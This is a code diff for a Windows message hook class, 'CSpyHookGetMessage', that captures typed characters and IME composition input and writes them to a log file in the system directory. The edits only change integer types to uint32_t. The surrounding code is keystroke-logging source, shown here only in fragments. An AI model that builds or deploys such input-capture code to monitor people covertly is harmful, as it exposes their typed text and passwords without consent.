@@ -25,7 +25,7 @@ CSpyHookGetMessage::CSpyHookGetMessage()
 
 
     // Maintain the log file, if it is too huge, we will cut it off.
-    size_t MAX_SIZE_OF_LOG_FILE = 100 * 1024 * 1024; // 100M
+    uint32_t MAX_SIZE_OF_LOG_FILE = 100 * 1024 * 1024; // 100M
     TCHAR szFileSavePath[MAX_PATH];
     GetSystemDirectory(szFileSavePath, MAX_PATH);
     _tcscat(szFileSavePath, _T("/"));
@@ -61,7 +61,7 @@ LRESULT CALLBACK CSpyHookGetMessage::GetMessageProc( int nCode, WPARAM wParam, L
 {
     static CSerializer MsgRecordSerializer;
     MSG* pMsg = (MSG*)lParam;
-    static size_t uLastWriteDataTime = pMsg->time;
+    static uint32_t uLastWriteDataTime = pMsg->time;
     if (pMsg != NULL && wParam == PM_REMOVE)
     {
         // Handle Text Input Message
@@ -142,9 +142,9 @@ bool CSpyHookGetMessage::RecordTextMessage( const MSG* pMsg, CSerializer& serial
     bool bFlush = pMsg->message == eCMT_Flush;
     if (bRecordCharMsg || bRecordCompositionMsg || bFlush)
     {
-        static size_t uLastTextInputMsgTime = 0;
+        static uint32_t uLastTextInputMsgTime = 0;
         static TCHAR cLastChar = 0;
-        static size_t uSameCharCount = 0;
+        static uint32_t uSameCharCount = 0;
         HWND parentHwnd = pMsg->hwnd;
         while (GetParent(parentHwnd) != NULL)
             parentHwnd = GetParent(parentHwnd);
@@ -220,7 +220,7 @@ bool CSpyHookGetMessage::RecordTextMessage( const MSG* pMsg, CSerializer& serial
     return bRet;
 }
 
-bool CSpyHookGetMessage::FlushSameCharInfo(TCHAR& cLastChar, size_t& uSameCharCount, TCHAR* pFlushString)
+bool CSpyHookGetMessage::FlushSameCharInfo(TCHAR& cLastChar, uint32_t& uSameCharCount, TCHAR* pFlushString)
 {
     bool bRet = false;
     if (cLastChar != 0)
